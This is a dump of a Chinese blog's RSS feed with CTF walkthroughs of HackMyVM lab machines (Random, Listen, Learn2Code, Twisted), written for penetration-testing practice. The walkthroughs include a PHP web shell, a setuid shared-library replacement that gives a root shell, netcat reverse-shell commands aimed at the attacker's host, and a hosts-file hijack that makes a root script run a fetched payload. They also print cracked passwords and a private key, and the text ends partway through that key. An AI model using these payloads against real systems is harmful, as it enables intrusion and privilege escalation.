<br><a data-tooltip-position="top" aria-label="5. 提权 -动态链接库替换" data-href="#5. 提权 -动态链接库替换" href="https://www.c1trus.top/about:blank#5._提权_-动态链接库替换" class="internal-link" target="_self" rel="noopener nofollow">5. 提权 -动态链接库替换</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Random
<br>作者：sml
<br>难度：⭐️⭐️⭐️
<br>知识点：动态链接库替换
<br><br>┌──(root㉿kali)-[/home/kali/hmv/random]
└─# nmap 192.168.9.17 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 19:38 CST
Nmap scan report for 192.168.9.17
Host is up (0.00040s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:88:4C:D2 (Oracle VirtualBox virtual NIC)
<br>首页<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.001.png" referrerpolicy="no-referrer"><br>获取到两个用户<br>alan 
eleanor
<br>目录扫描 啥都没有<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.002.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.003.png" referrerpolicy="no-referrer"><br><br>匿名登录发现进不来目录<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.004.png" referrerpolicy="no-referrer"><br>尝试用另外两个用户登录<br>hydra爆破试试<br>他说alan不能ssh登录<br>那么eleanor 用户可以ssh<br>爆破eleanor用户<br>这爆破出用户eleanor 的ftp密码是 ladybug<br>但权限只有读。<br>所以无法上传马儿<br><br>尝试用这个密码ssh上去<br>失败了<br>ssh eleanor@192.168.9.17
eleanor@192.168.9.17's password:
This service allows sftp connections only.
Connection to 192.168.9.17 closed.
<br>但告诉我们允许sftp链接<br>sftp eleanor@192.168.9.17
<br>用sftp连接上来就可以上传文件了<br>直接上传一个马儿<br>&lt;?php system($\_POST['cmd']);
echo ok;?&gt;
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.005.png" referrerpolicy="no-referrer"><br><br>上来后基本命令检测没有利用的<br>我们之前不让用密码进行ssh登录<br>但是可以用密码切换用户<br>su eleanor
eleanor@random:/home/eleanor$ cat note.txt
alan disabled my access via SSH but not my account.
He is a bad admin!
-eleanor
eleanor@random:/home/eleanor$ cat user.txt
ihavethapowah
eleanor@random:/home/eleanor$
<br>近用户目录发现 random可以被执<br>直接下下来分析<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.006.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.007.png" referrerpolicy="no-referrer"><br>就是检测以当前时间为种子的随机数的0-9的余数能不能与我们输入的值相等<br>我们只要一直输入0-9之间的数，总可以匹配上<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.008.png" referrerpolicy="no-referrer"><br>回去看一下发现makemeroot函数没有写执行代码，直接return自己了<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.009.png" referrerpolicy="no-referrer"><br>可能是调用了本地的动态链接库<br>ldd random
eleanor@random:/home/alan$ ldd random
        linux-vdso.so.1 (0x00007ffc0a3e5000)
        librooter.so =&gt; /lib/librooter.so (0x00007f7bcafa1000)
        libc.so.6 =&gt; /lib/x86\_64-linux-gnu/libc.so.6 (0x00007f7bcade0000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f7bcafb2000)
<br>而且/lib/librooter.so链接库是可写的<br>eleanor@random:/home/alan$ ls /lib/librooter.so -la
-rwxrwxrwx 1 root root 15984 Oct 19  2020 /lib/librooter.so
<br>直接替换掉<br>#include &lt;stdlib.h&gt;

void makemeroot()
{
        setuid(0);
        setgid(0);
        system("/bin/bash");
}
<br>本地编译好后传上去替换即可<br>然后运行即可获取root<br>howiarrivedhere
]]></description><link>https://www.c1trus.top/24-渗透/hmv/15.random.html</link><guid isPermaLink="false">24-渗透/HMV/15.Random.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[14.Listen]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. 提权" data-href="#3. 提权" href="https://www.c1trus.top/about:blank#3._提权" class="internal-link" target="_self" rel="noopener nofollow">3. 提权</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Listen
<br>作者：sml
<br>难度：⭐️⭐️⭐️
<br>知识点：流量监听、knock、文件替换、
<br><br>端口扫描<br>┌──(root㉿kali)-[/home/kali/hmv/listen]
└─# nmap -sS 192.168.9.16 -p 1-65535
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 22:10 CST
Nmap scan report for 192.168.9.16
Host is up (0.0016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE    SERVICE
22/tcp filtered ssh
80/tcp filtered http
MAC Address: 08:00:27:B0:44:F9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds
<br>两个端口都开了防火墙。<br>这里扫一下udp<br>┌──(root㉿kali)-[/home/kali/hmv/listen]
└─# nmap -sU 192.168.9.16 -p 1-100  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 22:14 CST
Nmap scan report for 192.168.9.16
Host is up (0.0012s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
MAC Address: 08:00:27:B0:44:F9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 114.71 seconds
<br>也没有啥东西<br>Curl一下<br>┌──(root㉿kali)-[/home/kali/hmv/listen]
└─# curl http://192.168.9.16
&lt;pre&gt;
&lt;h1&gt; Please Listen &lt;/h1&gt;
When I ask you to listen to me
and you start giving me advice,
You have not done what I asked.

When I ask you to listen to me
and you begin to tell me why
I shouldnt feel that way,
you are trampling on my feelings.

When I ask you to listen to me
and you feel you have to do something
to solve my problem,
you have failed me,
strange as that may seem.

Listen! All I ask is that you listen.
Dont talk or do, just hear me…

And I can do for myself; I am not helpless.
Maybe discouraged and faltering,
but not helpless.

When you do something for me that I can and need to do for myself,
you contribute to my fear and
Inadequacy.

But when you accept as a simple fact
That I feel what I feel,
No matter how irrational,
Then I can stop trying to convince
You and get about this business
Of understanding whats behind
This irrational feeling.

And when thats clear, the answers are obvious and I dont need advice.
Irrational feelings make sense when
we understand whats behind them.

So please listen, and just hear me.
And if you want to talk, wait a minute
for your turn, and I will listen to you.

-Leo Buscaglia
&lt;/pre&gt;


&lt;!--
Leo please, stop using your poems as password!
leo:$6$GyxLtjMYaQWxRxfl$w0mjIXfmU1T8bac2HgweZmxgFjGSiX8kbPDWhJzAzFn.BFk9X9fPT6DHXlp.A3J5yA64qQJH6Iu4K4AW4THIw.:18551:0:99999:7:::
--&gt;
<br>这里得到一个用户 和用户的hash<br>用户 Leo Buscaglia
hash leo:$6$GyxLtjMYaQWxRxfl$w0mjIXfmU1T8bac2HgweZmxgFjGSiX8kbPDWhJzAzFn.BFk9X9fPT6DHXlp.A3J5yA64qQJH6Iu4K4AW4THIw.:18551:0:99999:7:::
<br>爆破一下hash<br>再扫描端口可以发现端口已经开放了<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.001.png" referrerpolicy="no-referrer"><br>开发了就扫一波目录<br>啥都没有<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.002.png" referrerpolicy="no-referrer"><br>rockyou没有爆出来。<br>解密提示爆破获取密码<br>Curl返回的内容告诉我们<br>Leo please, stop using your poems as password!<br>说明他的密码多半就藏在诗句当中<br>我们将诗句生成一个字典<br>text = """
poem
"""
import string
translator = str.maketrans('', '', string.punctuation)
words = text.translate(translator).lower().split()

# 使用集合去重并排序
unique\_words = sorted(set(words))

# 将结果写入 txt 文件
with open("pass\_dic.txt", "w") as file:
    for word in unique\_words:
        file.write(word + "\n")
<br>利用hydra爆破<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.003.png" referrerpolicy="no-referrer"><br>获取到密码 contribute<br><br>leo@listen:~$ find / -perm -4000 2&gt;/dev/null
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/home/leo/poem

leo@listen:~$ ./poem 
Ask me:
 i

Why
leo@listen:~$ 
<br>逆向分析一下<br>传文件
nc -lvp 1234 &gt;poem
nc 192.168.9.3 1234 &lt;poem
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.004.png" referrerpolicy="no-referrer"><br>这里存在一个缓存区溢出漏洞，但这个是无法利用的。因为编译器对其施加了保护措施<br>解密listen<br>靶机名肯定不是乱取的<br>listen的中文意思就是 听 监听<br>那我们监听一下这个ip<br>tcpdump host 192.168.9.16 -A -n
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.005.png" referrerpolicy="no-referrer"><br><br>可以获取到一个用户名与密码 <br>以及提示 knock 1337端口 应该就是开放ssh服务端口<br>silence连进去<br>silence@listen:~$ cat note.txt 
"listen" told me that if I listen, I will hear his password....
<br>silence@listen:~$ ls -al
total 36
drwxr-xr-x 3 silence silence 4096 Oct 16  2020 .
drwxr-xr-x 5 root    root    4096 Oct 16  2020 ..
-rw-r--r-- 1 silence silence  220 Oct 16  2020 .bash\_logout
-rw-r--r-- 1 silence silence 3526 Oct 16  2020 .bashrc
-rw-r----- 1 root    silence   53 Oct 16  2020 listen.sh
drwxr-xr-x 3 silence silence 4096 Oct 16  2020 .local
-rw-rw---- 1 silence silence   64 Oct 16  2020 note.txt
-rw-r--r-- 1 silence silence  807 Oct 16  2020 .profile
-rw------- 1 silence silence  260 Oct 16  2020 .Xauthority
silence@listen:~$ cat listen.sh 
#!/bin/sh
cat /home/listen/password.txt &gt; /dev/pts/4
<br>这条命令会将/home/listen/password.txt 的内容发送到dev/pts/4 这个终端<br>猜测这个脚本多半会被某个进程执行<br>用Pspy64检测一下<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.006.png" referrerpolicy="no-referrer"><br>root用户会执行<br>silence@listen:~$ ls /dev/pts -la
total 0
drwxr-xr-x  2 root    root      0 Nov  8 10:18 .
drwxr-xr-x 17 root    root   3180 Nov  8 10:18 ..
crw--w----  1 silence tty  136, 0 Nov  8 10:50 0
c---------  1 root    root   5, 2 Nov  8 10:18 ptmx
<br>这里目前只有一个终端<br>我们需要多创建几个终端 使他达到4<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.007.png" referrerpolicy="no-referrer"><br>这里我们开了5个终端 <br>在第4个终端里面等待他给我们输出密码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.008.png" referrerpolicy="no-referrer"><br>获取到listen用户的密码<br>listen@listen:~$ cat user.txt
HMVimlistening
<br>提权root<br>这里有两种方法。<br>替换listen.sh法<br>listen.sh脚本处于我们silence的用户目录下<br>且我们是有权限删除他的<br>替换成我们想要的脚本<br>echo 'nc -e /bin/bash/192.168.9.3 1234' &gt; listen.sh
<br>然后监听就可以返回root的shell了<br>修改host法<br>在listen用户下发现一个脚本<br>listentome.sh<br>silence@listen:/home/listen$ cat listentome.sh 
wget -O - -q http://listen/ihearyou.sh | bash
<br>他会获取一个ihearyou.sh并执行脚本<br>利用脚本检测还可以发现 /etc/hosts是可以修改的<br>我们直接修改这个hosts指向我们的kali<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.009.png" referrerpolicy="no-referrer"><br>kali开一个服务器，在ihearyou.sh里面写入反弹shell的命令<br>nc -c /bin/bash 192.168.9.3 1234
<br>HMVthxforlisten
]]></description><link>https://www.c1trus.top/24-渗透/hmv/14.listen.html</link><guid isPermaLink="false">24-渗透/HMV/14.Listen.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[13.Learn2Code]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 目录扫描" data-href="#2.1. 目录扫描" href="https://www.c1trus.top/about:blank#2.1._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 目录扫描</a>


<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Learn2Code
<br>作者：x4v1l0k
<br>难度：😅机子不出网，做不了
<br>知识点：栈溢出
<br><br>┌──(root㉿kali)-[/home/kali/hmv/Learn2Code]
└─# nmap -sS 192.168.9.15 -p 1-65535
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 21:14 CST
Nmap scan report for 192.168.9.15
Host is up (0.00041s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:7E:55:49 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.27 seconds
<br><br>┌──(root㉿kali)-[/home/kali/hmv/Learn2Code]
└─# gobuster dir -u http://192.168.9.15 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.9.15
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,png,zip,txt,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 1161]
/includes             (Status: 301) [Size: 315] [--&gt; http://192.168.9.15/includes/]
/todo.txt             (Status: 200) [Size: 51]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
<br>这几个200的都访问不了<br>继续对includes目录进行扫描<br>┌──(root㉿kali)-[/home/kali/hmv/Learn2Code]
└─# dirsearch -u http://192.168.9.15/includes
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html
  from pkg\_resources import DistributionNotFound, VersionConflict

  \_|. \_ \_  \_  \_  \_ \_|\_    v0.4.3
 (\_||| \_) (/\_(\_|| (\_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/Learn2Code/reports/http\_192.168.9.15/\_includes\_24-11-06\_21-19-31.txt

Target: http://192.168.9.15/

[21:19:31] Starting: includes/
[21:19:31] 301 -  319B  - /includes/php  -&gt;  http://192.168.9.15/includes/php/
[21:19:31] 301 -  318B  - /includes/js  -&gt;  http://192.168.9.15/includes/js/
[21:19:32] 403 -  277B  - /includes/.ht\_wsr.txt
[21:19:32] 403 -  277B  - /includes/.htaccess.bak1
[21:19:32] 403 -  277B  - /includes/.htaccess.save
[21:19:32] 403 -  277B  - /includes/.htaccess.sample
[21:19:32] 403 -  277B  - /includes/.htaccess\_extra
[21:19:32] 403 -  277B  - /includes/.htaccess.orig
[21:19:32] 403 -  277B  - /includes/.htaccess\_sc
[21:19:32] 403 -  277B  - /includes/.htaccessOLD2
[21:19:32] 403 -  277B  - /includes/.htaccess\_orig
[21:19:32] 403 -  277B  - /includes/.htaccessBAK
[21:19:32] 403 -  277B  - /includes/.htaccessOLD
[21:19:32] 403 -  277B  - /includes/.htm
[21:19:32] 403 -  277B  - /includes/.htpasswd\_test
[21:19:32] 403 -  277B  - /includes/.htpasswds
[21:19:32] 403 -  277B  - /includes/.html
[21:19:32] 403 -  277B  - /includes/.httr-oauth
[21:19:32] 403 -  277B  - /includes/.php
[21:19:40] 301 -  319B  - /includes/css  -&gt;  http://192.168.9.15/includes/css/
[21:19:43] 200 -  579B  - /includes/js/
[21:19:47] 200 -  557B  - /includes/php/

Task Completed
<br>/includes/css<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125000545.png" referrerpolicy="no-referrer"><br>又是一个文件读取<br>在/includes/php/access.php.bak 获取到一个有用的文件<br>还获取到一句话<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125000549.png" referrerpolicy="no-referrer"><br>查看access.php.bak<br>&lt;?php
        require\_once 'GoogleAuthenticator.php';
        $ga = new PHPGangsta\_GoogleAuthenticator();
        $secret = "S4I22IG3KHZIGQCJ";

        if ($\_POST['action'] == 'check\_code') {
                $code = $\_POST['code'];
                $result = $ga-&gt;verifyCode($secret, $code, 1);

                if ($result) {
                        include('coder.php');
                } else {
                        echo "wrong";
                }
        }
?&gt;
<br>
卡住了。看了wp才知道。原来是我出不了网的问题😅
]]></description><link>https://www.c1trus.top/24-渗透/hmv/13.learn2code.html</link><guid isPermaLink="false">24-渗透/HMV/13.Learn2Code.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125000545.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125000545.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[11.Twisted]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 端口扫描" data-href="#2. 端口扫描" href="https://www.c1trus.top/about:blank#2._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="3. 目录扫描" data-href="#3. 目录扫描" href="https://www.c1trus.top/about:blank#3._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">3. 目录扫描</a>
<br><a data-tooltip-position="top" aria-label="4. 图片解密" data-href="#4. 图片解密" href="https://www.c1trus.top/about:blank#4._图片解密" class="internal-link" target="_self" rel="noopener nofollow">4. 图片解密</a>
<br><a data-tooltip-position="top" aria-label="5. 提权到bonita" data-href="#5. 提权到bonita" href="https://www.c1trus.top/about:blank#5._提权到bonita" class="internal-link" target="_self" rel="noopener nofollow">5. 提权到bonita</a>
<br><a data-tooltip-position="top" aria-label="6. 提权到root" data-href="#6. 提权到root" href="https://www.c1trus.top/about:blank#6._提权到root" class="internal-link" target="_self" rel="noopener nofollow">6. 提权到root</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Twisted
<br>作者：sml
<br>难度：⭐️⭐️
<br>知识点：capbility提权 、stegseek解密图片加密
<br><br>┌──(root㉿kali)-[/home/kali]
└─# nmap -sS 192.168.9.13 -p 1-65535 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 16:02 CST
Nmap scan report for 192.168.9.13
Host is up (0.00042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
MAC Address: 08:00:27:4A:6C:9F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.20 seconds
<br>看下网站<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.001.png" referrerpolicy="no-referrer"><br>把两张图片保存到本地<br><br>┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.9.13/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.9.13/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,php,html,png,zip,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
<br>啥都没有<br><br>misc做的少，试了好几种方式没解出来。看了下wp用 <a data-tooltip-position="top" aria-label="../../26-工具使用/StegSeek使用" data-href="../../26-工具使用/StegSeek使用" href="https://www.c1trus.top/26-工具使用/stegseek使用.html" class="internal-link" target="_self" rel="noopener nofollow">stegseek</a>爆破<br>
<br>stegseek --seed cat-hidden.jpg 检测是否使用steghide进行编码
<br>┌──(root㉿kali)-[/home/kali/hmv/Twisted]
└─# stegseek --seed cat-hidden.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found (possible) seed: "841e4403"            
        Plain size: 47.0 Byte(s) (compressed)
        Encryption Algorithm: rijndael-128
        Encryption Mode:      cbc
<br>
<br>stegseek --crack 爆破解密
<br>┌──(root㉿kali)-[/home/kali/hmv/Twisted]
└─# stegseek --crack cat-hidden.jpg  /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "sexymama"
[i] Original filename: "mateo.txt".
[i] Extracting to "cat-hidden.jpg.out".

                                                                                              
┌──(root㉿kali)-[/home/kali/hmv/Twisted]
└─# stegseek --crack cat-original.jpg  /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "westlife"
[i] Original filename: "markus.txt".
[i] Extracting to "cat-original.jpg.out".

┌──(root㉿kali)-[/home/kali/hmv/Twisted]
└─# cat cat-hidden.jpg.out 
thisismypassword
                                                                                              
┌──(root㉿kali)-[/home/kali/hmv/Twisted]
└─# cat cat-original.jpg.out 
markuslovesbonita
<br>意思是markuslovesbonita 是他的密码？<br>原始文件名可能是用户名 markus  mateo<br>经过测试获取到两个用户与对应的账户密码<br>markus   markuslovesbonita 
mateo    thisismypassword
<br>ssh端口就是2222<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.002.png" referrerpolicy="no-referrer"><br><br>markus@twisted:~$ find / -perm -4000 2&gt;/dev/null
/home/bonita/beroot
/usr/bin/su
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
markus@twisted:~$ sudo -l
-bash: sudo: command not found
markus@twisted:~$ cd /home/bonita/
markus@twisted:/home/bonita$ ./beroot
-bash: ./beroot: Permission denied
<br>看来是需要我们先整到bonita用户<br>看下给markus我们的提示<br>markus@twisted:~$ cat note.txt 
Hi bonita,
I have saved your id\_rsa here: /var/cache/apt/id\_rsa
<br>告诉我们这里存在Bonista用户的私钥<br>markus@twisted:/var/cache/apt$ ls -l
total 62172
drwxr-xr-x 3 root root    12288 Oct 14  2020 archives
-rw------- 1 root root     1823 Oct 14  2020 id\_rsa
-rw-r--r-- 1 root root 31831069 Oct 14  2020 pkgcache.bin
-rw-r--r-- 1 root root 31810419 Oct 14  2020 srcpkgcache.bin
<br>但我们没有权限读取这个私钥<br>mateo的提示<br>mateo@twisted:~$ cat note.txt 
/var/www/html/gogogo.wav
<br>听一下这个音频感觉像是摩斯电码<br>解密<a rel="noopener nofollow" class="external-link" href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html" target="_blank">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a><br>G O D E E P E R . . . C O M E W I T H M E . . . L I T T L E R A B B I T . . .<br>好像没有什么意义<br>常见的提权SUID 与 SUDO 都看了 <br>看一下Capability<br>mateo@twisted:/var/www/html$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping = cap\_net\_raw+ep
/usr/bin/tail = cap\_dac\_read\_search+ep
<br>用tail读取私钥<br>tail -c1G "/var/cache/apt/id\_rsa"
<br>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd
FyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS
olvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1
vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF
gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C
tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM
gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC
xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8
DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H
uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD
XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu
U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI
mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/
hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro
nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK
mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+
bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq
yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP
UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh
V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ
LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz
a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF
eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu
